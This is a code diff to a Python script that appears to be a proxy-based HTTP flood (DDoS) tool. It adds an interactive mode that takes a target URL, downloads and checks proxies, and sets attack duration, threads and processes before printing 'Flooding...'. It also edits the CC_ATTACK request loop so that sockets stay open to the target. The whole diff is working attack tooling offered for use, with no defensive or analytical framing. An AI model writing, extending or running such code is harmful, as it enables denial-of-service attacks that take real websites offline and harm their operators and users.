@@ -16,8 +16,8 @@ import time
 import requests
 
 try:
-	import win32file
-	win32file._setmaxstdio(8192)
+	import win32file# I guess linux won't have this library, doesn't it?
+	win32file._setmaxstdio(8192)# It's somehow equal to 'ulimit -n 8192' in linux but it's for windows
 	#print("Set")
 except:
 	pass
@@ -26,7 +26,7 @@ try:
 	import socks
 except:
 	print("Please install pysocks from pip.")
-	exit(-1)
+	exit(126)
 
 #############################
 #         variables         #
@@ -255,6 +255,7 @@ def PrintHelp():
 │   -rand     │ enable random url/post data                  │
 │   -down     │ download proxies                             │
 │   -check    │ check proxies                                │
+│   -old      | enable old interface                         │
 └─────────────┴──────────────────────────────────────────────┘''')
 
 #################################
@@ -476,6 +477,8 @@ def CC_ATTACK(vars,event):
 				s.sendall(str.encode(request))
 				s.settimeout(2)
 			# Close the socket (maybe not close will get better result?)
+			# Not closing the socket immediately
+			# because usually the data are not totally sent to target yet
 			#s.shutdown(2)
 			#s.close()
 		except:
@@ -488,7 +491,7 @@ def CC_ATTACK(vars,event):
 #################################
 #      Process Input stuff      #     
 #################################
-'''Haven't need
+
 def InputOption(question, options, default):
 	# Ask the user for an input until a valid response is given
 	while True:
@@ -505,7 +508,7 @@ def InputOption(question, options, default):
 
 		# Otherwise, print an error message and loop again
 		print("> Please enter the correct option")
-'''
+
 
 def ParseUrl(original_url,vars):
 	# Strip leading/trailing white space from the original URL
@@ -538,53 +541,93 @@ def ParseUrl(original_url,vars):
 #################################
 #         Input stuff          #
 #################################
-'''haven't done, lazy to do it
+#haven't done, lazy to do it
 def oldcli(vars):
 	print("> Method: [get/post/head]")#/slow/check]") #haven't finished
-	vars["Method"] = InputOption("> Choose Your Method (default=get) :",["get","post","head"],"get")#,"slow","check"],"cc")
+	vars.method = InputOption("> Choose Your Method (default=get) :",["get","post","head"],"get")#,"slow","check"],"cc")
 	url = str(input("> Input the target url:")).strip()
 	ParseUrl(url,vars)
-	if vars["Method"] == "post":
+	if vars.method == "post":
 		if InputOption("> Customize post data? (y/n, default=n):",["y","n","yes","no"],"n") == "y":
 			data = open(input("> Input the file's path:").strip()).readlines()
-			vars["Payload"] = ' '.join([str(txt) for txt in data])
+			vars.payload = ' '.join([str(txt) for txt in data])
 	if InputOption("> Customize cookies? (y/n, default=n):",["y","n","yes","no"],"n") == "y":
-		vars["Cookies"] = str(input("Plese input the cookies:")).strip()
-	choice = InputOption("> Choose your socks Method(4/5, default=5):",["4","5"],"5")
-	if choice == "4":
-		socks_type = 4
-	else:
-		socks_type = 5
-	#if vars["Method"] == "check":
-		#CheckerOption()
-		#print("> End of process")
-		#return
-	#if vars["Method"] == "slow":	
-	#	vars["Thread_num"] = int(input("> Connections(default=400):"))
-	#else:
-		vars["Thread_num"] = int(input("> Threads(default=400):"))
-	#CheckerOption()
-	ind_rlock = threading.RLock()
-	if Method == "slow":
-		input("Press Enter to continue.")
-		th = threading.Thread(target=slow,args=(thread_num,socks_type,))
-		th.setDaemon(True)
-		th.start()
-	else:
-		event = threading.Event()
-		print("> Building threads...")
-		SetupIndDict()
-		build_threads(Method,thread_num,event,socks_type,ind_rlock)
-		event.clear()
-		input("Press Enter to continue.")
-		event.set()
-	threading.Thread(target=OutputToScreen,args=(ind_rlock,),daemon=True).start()
-	while True:
+		vars.cookies = str(input("> Plese input the cookies:")).strip()
+
+	ver = InputOption("> Choose your proxy type(4/5/http, default=5):",["4","5","http"],"5")
+	if ver == "4":
+		vars.proxy_type = 4
+	elif ver == "5":
+		vars.proxy_type = 5
+	elif ver == "http":
+		vars.proxy_type = 0
+
+	tmp = InputOption("> Do you need to download proxies? (y/n, default=y):",["y","n"],"y")
+	proxy_file = str(input("> Proxies file name (default=proxy.txt):"))
+	if proxy_file == "":
+		proxy_file = "proxy.txt"
+	if tmp == "y":
+		print("> Started downloading proxies...")
+		download_proxies(vars,proxy_file)
+		print("> Proxies Downloaded")
+
+	if os.path.exists(proxy_file)!=True:
+		print("Proxies file not found")
+		return
+
+	vars.proxies_list = open(proxy_file).readlines()
+	tmp = InputOption("> Do you need to check the proxiesd? (y/n):",["y","n"],"y")
+	if tmp == "y":
+		vars.proxies_list = list(ProxiesChecker(vars.proxies_list,vars.proxy_type,vars.target_url,vars.timeout))
+		with open(proxy_file, "w") as f:
+			for line in vars.proxies_list:
+				f.write(line+"\r\n")
+		# Double check
+		check_list(proxy_file)
+		vars.proxies_list = open(proxy_file).readlines()
+
+	if len(vars.proxies_list) == 0:
+		print("> There are no more proxies. Please download a new proxies list.")
+		return
+	print ("> Number Of Proxies: %d" %(len(vars.proxies_list)))
+	try:
+		durations = int(input("> Durations of attacking ( 0 for no time limit ):"))
+	except:
+		print("> Durations of attacking should be a integer")
+		return
+	
+	tmp = str(input("> Number of process (default=1):"))
+	if tmp != "":
 		try:
-			time.sleep(0.1)
-		except KeyboardInterrupt:
-			break
-'''
+			vars.process_num = int(tmp)
+		except:
+			print("[!] Number of process should be an integer")
+			exit(2)
+
+	tmp = str(input("> Number of threads (default=400):"))
+	if tmp != "":
+		try:
+			vars.threads_num = int(tmp)
+		except:
+			print("[!] Number of thread should be an integer")
+			exit(2)
+
+	event = multiprocessing.Event()
+	print("> Building Process...")
+	build_processes(vars,event)
+	event.clear()
+	input("Press Enter to continue.")
+	event.set()
+	print("> Flooding...")
+	if durations > 0:
+		time.sleep(durations)
+	else:
+		while True:
+			try:
+				time.sleep(0.5)
+			except KeyboardInterrupt:
+				break
+
 def main():
 	#Initial those "global" varibles
 	vars = global_vars()
@@ -595,8 +638,9 @@ def main():
 	durations = 60
 	proxy_file = "proxy.txt"
 	for n,args in enumerate(sys.argv):
-		#if args == "-oldcli":
-			#oldcli(vars)
+		if args == "-old":
+			oldcli(vars)
+			return
 		if args == "-help" or args =="-h":
 			help =True
 		if args=="-url":
